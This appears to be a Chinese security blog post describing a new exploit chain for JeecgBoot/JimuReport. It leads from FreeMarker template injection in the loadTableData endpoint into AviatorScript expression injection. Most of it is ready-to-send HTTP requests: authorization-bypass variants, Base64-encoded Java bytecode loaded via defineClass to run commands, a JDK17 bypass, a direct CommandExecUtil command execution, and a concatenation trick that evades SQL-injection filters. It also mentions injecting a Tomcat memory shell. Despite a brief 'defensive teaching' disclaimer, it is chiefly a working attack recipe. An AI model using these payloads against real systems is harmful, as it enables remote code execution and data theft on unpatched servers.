---
title: Jeecgboot SSTI老洞新招
url: https://mp.weixin.qq.com/s/jBKXOUbDKQuQsoKVsGEW3Q
source: Doonsec's feed
date: 2026-06-24
fetch_date: 2026-06-25T06:02:26.062073
---

# Jeecgboot SSTI老洞新招

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/TiagI92C6O0qIPM1VdJQFueEoJMalMcdXAXLrmicMgU6nRgmEygwVPd8zq20vAwqlgunlQ8Je1Lzrl05lyicBlvibLqP3LrdgLj21oEg3EKTRy4/0?wx_fmt=jpeg)

# Jeecgboot SSTI老洞新招

原创

XG小刚
XG小刚

XG小刚

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zbTIZGJWWSOIbTuiaicC4sNJvbX5OMzZiaibIu4MxboIfZ8GeiaQMFBrtd8YAK8NzX5a0dJZ6qoWI6niaRQibjgMnGcwA/640?wx_fmt=jpeg)

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG小刚

# Jeecgboot SSTI老洞新招

之前测项目遇到Jeecgboot框架，想去尝试一下模板注入那两个历史漏洞，发现queryFieldBySql和loadTableData接口可以未授权访问，但是这俩接口的freemark模板注入已经被修复了

Jeecgboot修复的方式也很简单，就是jimureport的1.6.1版本开始，使用了freemark自身的配置`setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`，限制了new()可用的三个类。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiagI92C6O0oKIhVicuFKLgmQoNy03QogIBpic1BiaQ5Zeb47xCVE8tx8j4H5iaDcs2uqEpWOAjkibLktNwBWc00KahS8yoia5b31MoicoOEicwXTdq0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiagI92C6O0q75QkY8KNtNI1qcrRCDyIVTPlYNunqj0cia9tZkkQ5ZEsD7ecpPrOO3LMeGpXZUgho1Mc63jcTZzzeJcoht0td1AQDAibGdr8TM/640?wx_fmt=png&from=appmsg)

想尝试一下沙箱绕过，发现freemark版本高于2.3.30，没法利用protectionDomain进行绕过沙箱利用。

而且springMacroRequestContext也未开启，没法去禁用freemark沙箱，所以也就彻底修复了。

然后去尝试save接口的AviatorScript表达式注入也没利用成功......

## 新发现

继续尝试freemark沙箱绕过时，是需要找到一个可用的object，才能调用对应的方法或者获取对应class

然后发现在执行freemark模板时，传入了两个实例`jeecg`和`isNotEmpty`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiagI92C6O0qic6AltZPdCPY5Jvkibiaibpx4PnXImjVGp2ByxGkvAa7RWBzAB3iaaJPbLiaezWicayvyictMM85PFQ8DSF6w6MbngKUXflWMibaQzSVg/640?wx_fmt=png&from=appmsg)

跟进`FreemarkerMethod`类里面，发现里面有个`compute()`方法，并且该方法可以执行AviatorScript表达式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiagI92C6O0qJNznurZebARxIhzRJwC2UibJIslwARgSpd5KLpVy6I8fSCC7AzzThkXJw514s1bcCKJXJSBoMoXhEnn54Lq0G4XNUG1K7xDFI/640?wx_fmt=png&from=appmsg)

那么只要利用freemark去调用jeecg的compute()方法，然后传递对应参数就可以构造freemark模板到AviatorScript表达式注入的利用链

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json;charset=UTF-8
Content-Length: 113

{"dbSource":"","sql":"select \"${jeecg.compute(null,{'a':'a'},'7*7')}\"","tableName":"","pageNo":1,"pageSize":10}
```

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0qykeDH6RmH7kturs9X9ibUSRmYKGsh3wq0gL6MxicB7aLfgx4xE5ByggDsqALBqM5JLrGQSiariccLr8parDrnAbSEUBg5bFJaSNo/640?wx_fmt=png&from=appmsg)

然后利用Aviator表达式命令执行或打内存马就行了

## freemark->Aviator利用

利用java-chains生成表达式即可

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0qGlxJU43nibYEkk8jIcepibOPquuLzdO4cM4wmjs9Gu8ctcnG7gC8nuklAQeQFraktuiafr0VQibYbfAjictYxpfe8SNWyGIR6ibFZk/640?wx_fmt=png&from=appmsg)

命令执行

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json;charset=UTF-8
Content-Length: 1386

{"dbSource":"","sql":"callll{${jeecg.compute(null,{'1':'1'},\"use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('Test',Base64Utils.decodeFromString('yv66vgAAADIAQAEABFRlc3QHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAIPGNsaW5pdD4BABJvcGVuIC1hIGNhbGN1bGF0b3IIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA='),ClassLoader.getSystemClassLoader());\")};#{1}","tableName":"","pageNo":1,"pageSize":10}
```

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0pWmH7EtkwkEvNrD1DO4ySjBd54iaicHKSEb2dUelNibX9T1duyyKRia4MU2uLNn3icib06WO9OrckiaoibuQ2T2kAr9Fj2BmSY19gAgiak/640?wx_fmt=png&from=appmsg)

打tomcat的Filter内存马

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0q9gsicj6v4WibibiaNkc9aZXPsVKiadEhtApy1gUMGMicmCbIMb4uq7oicgcCIZ3s6NPjG4xibykESVYG6ZpJqo8tybic4aHgNBaNOtVyc/640?wx_fmt=png&from=appmsg)

实战环境会遇到高版本JDK导致的拦截，比如JDK17

可以使用Whoopsunix师傅的高版本Aviator 表达式注入方法

https://whoopsunix.com/docs/java/Expression/Aviator/

```
POST /jeecg-boot/jmreport/loadTableData?previousPage=1&shareToken=123&token=1 HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json;charset=UTF-8
Content-Length: 1586

{"dbSource":"","sql":"callll{${jeecg.compute(null,{'1':'1'},\"use org.apache.commons.codec.binary.Base64;use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Testaa',Base64.decodeBase64('yv66vgAAADIAQAEAJW9yZy9zcHJpbmdmcmFtZXdvcmsvZXhwcmVzc2lvbi9UZXN0YWEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAIPGNsaW5pdD4BABJvcGVuIC1hIGNhbGN1bGF0b3IIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA='),ClassLoader.getSystemClassLoader(),nil,Class.forName('org.springframework.expression.ExpressionParser'));\")};#{1}","tableName":"","pageNo":1,"pageSize":10}
```

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0qVVB2n1fKicSmpE002icVKyBbEtkLxFcuwicVT1oZ35NVqmopjgPXVUhYXCBGjcGicJVicld2PRX4fwP4DVrYcuvjWEcfzwGdruAVA/640?wx_fmt=png&from=appmsg)

新版jeecgboot3.8.0开始多了个CommandExecUtil.execCommand()静态方法，也可以直接使用Aviator绕过JDK17进行命令执行

但是新版绕过授权方式修复了，所以只能在有token的情况下利用了

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json;charset=UTF-8
Content-Length: 285

{"dbSource":"","sql":"callll{${jeecg.compute(null,{'1':'1'},\"use org.apache.commons.lang3.StringUtils;use org.jeecg.modules.airag.llm.handler.CommandExecUtil;CommandExecUtil.execCommand('open -a calculator',StringUtils.split('',''));\")};#{1}","tableName":"","pageNo":1,"pageSize":10}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TiagI92C6O0q5jgpJyQDRS2HcQrMgCepX2VX0ecQaZhmia9a9GibZ6huo90UpEoGCt7RZPDD1MFGPMWqlYKwnGsYXTicznUIHr4BrTicwLnYC61k/640?wx_fmt=png&from=appmsg)

## freemark->sql利用

至于针对SQL注入的拦截，使用freemark的拼接即可完全绕过，就不过多说了

![](https://mmbiz.qpic.cn/mmbiz_png/TiagI92C6O0qbJJ5a90nA0XnXMwSjEuAVobnoBVIs9EVOxiahvz9flX9OmFPiaCULV3WFwvnQldef8pJgsKbhOmjFq5hoxqyBTWs7q6sZ0Dr1E/640?wx_fmt=png&from=appmsg)

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 127.0.0.1:18080
X-Access-Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODIyMzIzODIsInVzZXJuYW1lIjoiYWRtaW4ifQ.NAD7IHucl0qpPHafOZzrZcnhaiS49TVHRL6h8zAs-zU
Content-Type: application/json;charset=UTF-8
Content-Length: 215

{"dbSource":"","sql":"${\"se\"+\"lect upd\"+\"atexml(1,concat('~',(select table_name from informati\"+\"on_schema.tables where table_schema=database() limit 0,1),'~'),1)\"}" ,"tableNa...